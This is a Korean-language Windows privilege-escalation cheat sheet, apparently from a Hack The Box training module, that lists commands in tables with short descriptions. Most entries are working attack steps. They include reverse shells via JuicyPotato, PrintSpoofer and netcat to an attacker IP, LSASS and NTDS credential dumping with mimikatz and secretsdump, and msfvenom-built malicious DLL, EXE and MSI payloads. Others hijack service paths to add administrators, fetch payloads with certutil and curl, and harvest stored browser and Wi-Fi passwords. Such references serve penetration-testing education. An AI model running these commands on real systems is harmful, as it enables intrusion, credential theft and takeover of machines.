# 윈도우 권한 상승

| `xfreerdp /v:<target ip> /u:htb-student`                                                              | 연구 대상에 대한 RDP               |
| ----------------------------------------------------------------------------------------------------- | --------------------------- |
| `ipconfig /all`                                                                                       | 인터페이스, IP 주소 및 DNS 정보 가져오기  |
| `arp -a`                                                                                              | ARP 테이블 검토                  |
| `route print`                                                                                         | 라우팅 테이블 검토                  |
| `Get-MpComputerStatus`                                                                                | Windows Defender 상태 확인      |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`                            | AppLocker 규칙 나열             |
| `Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` | AppLocker 정책 테스트            |
| `set`                                                                                                 | 모든 환경 변수 표시                 |
| `systeminfo`                                                                                          | 자세한 시스템 구성 정보 보기            |
| `wmic qfe`                                                                                            | 패치 및 업데이트 받기                |
| `wmic product get name`                                                                               | 설치된 프로그램 받기                 |
| `tasklist /svc`                                                                                       | 실행 중인 프로세스 표시               |
| `query user`                                                                                          | 로그인한 사용자 가져오기               |
| `echo %USERNAME%`                                                                                     | 현재 사용자 가져오기                 |
| `whoami /priv`                                                                                        | 현재 사용자 권한 보기                |
| `whoami /groups`                                                                                      | 현재 사용자 그룹 정보 보기             |
| `net user`                                                                                            | 모든 시스템 사용자 가져오기             |
| `net localgroup`                                                                                      | 모든 시스템 그룹 가져오기              |
| `net localgroup administrators`                                                                       | 그룹에 대한 세부정보 보기              |
| `net accounts`                                                                                        | 비밀번호 정책 가져오기                |
| `netstat -ano`                                                                                        | 활성 네트워크 연결 표시               |
| `pipelist.exe /accepteula`                                                                            | 명명된 파이프 나열                  |
| `gci \\.\pipe\`                                                                                       | PowerShell을 사용하여 명명된 파이프 나열 |
| `accesschk.exe /accepteula \\.\Pipe\lsass -v`                                                         | 명명된 파이프에 대한 권한 검토           |

### 편리한 명령

| **명령**                                                                                                                                                                                | **설명**                                 |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------- |
| `mssqlclient.py sql_dev@10.129.43.30 -windows-auth`                                                                                                                                   | mssqlclient.py를 사용하여 연결                |
| `enable_xp_cmdshell`                                                                                                                                                                  | mssqlclient.py를 사용하여 xp\_cmdshell 활성화  |
| `xp_cmdshell whoami`                                                                                                                                                                  | xp\_cmdshell을 사용하여 OS 명령 실행            |
| `c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *`                                                             | JuicyPotato로 권한 확대                     |
| `c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"`                                                                                                               | PrintSpoofer로 권한 상승                    |
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp`                                                                                                                                    | ProcDump를 사용하여 메모리 덤프 수행               |
| `sekurlsa::minidump lsass.dmp`그리고`sekurlsa::logonpasswords`                                                                                                                           | MimiKatz를 사용하여 LSASS 메모리 덤프에서 자격 증명 추출 |
| `dir /q C:\backups\wwwroot\web.config`                                                                                                                                                | 파일 소유권 확인                              |
| `takeown /f C:\backups\wwwroot\web.config`                                                                                                                                            | 파일 소유권 가져오기                            |
| `Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}`                                             | 파일의 변경된 소유권 확인                         |
| `icacls “C:\backups\wwwroot\web.config” /grant htb-student:F`                                                                                                                         | 파일 ACL 수정                              |
| `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`                                                                                                            | secretsdump.py로 해시 추출                  |
| `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`                                                                                                                                         | ROBOCOPY를 사용하여 파일 복사                   |
| `wevtutil qe Security /rd:true /f:text \| Select-String "/user"`                                                                                                                      | 보안 이벤트 로그 검색                           |
| `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user"`                                                                                       | wevtutil에 자격 증명 전달                     |
| `Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` | PowerShell을 사용하여 이벤트 로그 검색             |
| `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`                                                                              | 악성 DLL 생성                              |
| `dnscmd.exe /config /serverlevelplugindll adduser.dll`                                                                                                                                | dnscmd를 사용하여 사용자 정의 DLL 로드             |
| `wmic useraccount where name="netadm" get sid`                                                                                                                                        | 사용자의 SID 찾기                            |
| `sc.exe sdshow DNS`                                                                                                                                                                   | DNS 서비스에 대한 권한 확인                      |
| `sc stop dns`                                                                                                                                                                         | 서비스 중지                                 |
| `sc start dns`                                                                                                                                                                        | 서비스 시작                                 |
| `reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`                                                                                                       | 레지스트리 키 쿼리                             |
| `reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll`                                                                              | 레지스트리 키 삭제                             |
| `sc query dns`                                                                                                                                                                        | 서비스 상태 확인                              |
| `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`                                                                                             | 전역 쿼리 차단 목록 비활성화                       |
| `Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`                                                | WPAD 레코드 추가                            |
| `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`                                                                                                                             | cl.exe로 컴파일                            |
| `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`                                                                                    | 드라이버에 대한 참조 추가 (1)                     |
| `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`                                                                                                              | 드라이버에 대한 참조 추가(2)                      |
| `.\DriverView.exe /stext drivers.txt`그리고`cat drivers.txt \| Select-String -pattern Capcom`                                                                                            | 드라이버가 로드되었는지 확인                        |
| `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`                                                                                                               | EopLoadDriver 사용                       |
| `c:\Tools\PsService.exe security AppReadiness`                                                                                                                                        | PsService로 서비스 권한 확인                   |
| `sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`                                                                                              | 서비스 바이너리 경로 수정                         |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`                                                                                | UAC가 활성화되었는지 확인                        |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`                                                               | UAC 수준 확인 중                            |
| `[environment]::OSVersion.Version`                                                                                                                                                    | 윈도우 버전 확인                              |
| `cmd /c echo %PATH%`                                                                                                                                                                  | 경로 변수 검토 중                             |
| `curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`                                                                           | PowerShell에서 cURL을 사용하여 파일 다운로드        |
| `rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll`                                                                                   | rundll32.exe를 사용하여 사용자 정의 dll 실행       |
| `.\SharpUp.exe audit`                                                                                                                                                                 | SharpUp 실행                             |
| `icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`                                                                                                                       | icacls로 서비스 권한 확인                      |
| `cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`                                                                                           | 서비스 바이너리 교체                            |
| `wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """`                                                      | 따옴표가 없는 서비스 경로 검색                      |
| `accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`                                                                                                    | 레지스트리에서 취약한 서비스 ACL 확인                 |
| `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`            | PowerShell을 사용하여 ImagePath 변경          |
| `Get-CimInstance Win32_StartupCommand \| select Name, command, Location, User \| fl`                                                                                                  | 시작 프로그램 확인                             |
| `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe`                                                                       | 악성 바이너리 생성                             |
| `get-process -Id 3324`                                                                                                                                                                | PowerShell을 사용하여 프로세스 ID 열거            |
| `get-service \| ? {$_.DisplayName -like 'Druva*'}`                                                                                                                                    | PowerShell을 사용하여 실행 중인 서비스를 이름으로 열거    |

### 자격 증명 도용

| **명령**                                                                                                                    | **설명**                     |
| ------------------------------------------------------------------------------------------------------------------------- | -------------------------- |
| `findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml`                                                              | "비밀번호"라는 문구가 포함된 파일 검색     |
| `gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password` | Chrome 사전 파일에서 비밀번호 검색     |
| `(Get-PSReadLineOption).HistorySavePath`                                                                                  | PowerShell 기록 저장 경로 확인     |
| `gc (Get-PSReadLineOption).HistorySavePath`                                                                               | PowerShell 기록 파일 읽기        |
| `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'`                                                                 | PowerShell 자격 증명 해독        |
| `cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt`                                         | 문자열에 대한 파일 내용 검색           |
| `findstr /si password *.xml *.ini *.txt *.config`                                                                         | 문자열에 대한 파일 내용 검색           |
| `findstr /spin "password" *.*`                                                                                            | 문자열에 대한 파일 내용 검색           |
| `select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password`                                              | PowerShell로 파일 콘텐츠 검색      |
| `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`                                        | 파일 확장자 검색                  |
| `where /R C:\ *.config`                                                                                                   | 파일 확장자 검색                  |
| `Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`                                  | PowerShell을 사용하여 파일 확장자 검색 |
| `cmdkey /list`                                                                                                            | 저장된 자격 증명 나열               |
| `.\SharpChrome.exe logins /unprotect`                                                                                     | 저장된 Chrome 자격 증명 검색        |
| `.\lazagne.exe -h`                                                                                                        | LaZagne 도움말 메뉴 보기          |
| `.\lazagne.exe all`                                                                                                       | 모든 LaZagne 모듈 실행           |
| `Invoke-SessionGopher -Target WINLPE-SRV01`                                                                               | 실행 중인 세션Gopher             |
| `netsh wlan show profile`                                                                                                 | 저장된 무선 네트워크 보기             |
| `netsh wlan show profile ilfreight_corp key=clear`                                                                        | 저장된 무선 비밀번호 검색             |

### 기타 명령

| **명령**                                                                                                      | **설명**                                |
| ----------------------------------------------------------------------------------------------------------- | ------------------------------------- |
| `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`                               | certutil을 사용하여 파일 전송                  |
| `certutil -encode file1 encodedfile`                                                                        | certutil을 사용하여 파일 인코딩                 |
| `certutil -decode encodedfile file2`                                                                        | certutil을 사용하여 파일 디코딩                 |
| `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`                                 | 항상 승격된 레지스트리 키 설치에 대한 쿼리 (1)          |
| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`                                              | 항상 승격된 레지스트리 키 설치에 대한 쿼리 (2)          |
| `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`                        | 악성 MSI 패키지 생성                         |
| `msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`                                     | 명령줄에서 MSI 패키지 실행                      |
| `schtasks /query /fo LIST /v`                                                                               | 예약된 작업 열거                             |
| `Get-ScheduledTask \| select TaskName,State`                                                                | PowerShell을 사용하여 예약된 작업 열거            |
| `.\accesschk64.exe /accepteula -s -d C:\Scripts\`                                                           | 디렉토리에 대한 권한 확인                        |
| `Get-LocalUser`                                                                                             | 로컬 사용자 설명 필드를 확인하세요.                  |
| `Get-WmiObject -Class Win32_OperatingSystem \| select Description`                                          | 컴퓨터 설명 필드 열거                          |
| `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd`                                                           | Linux에 VMDK 마운트                       |
| `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`                                               | Linux에 VHD/VHDX 탑재                    |
| `sudo python2.7 windows-exploit-suggester.py --update`                                                      | Windows Exploit Suggester 데이터베이스 업데이트 |
| `python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` | Windows Exploit Suggester 실행          |
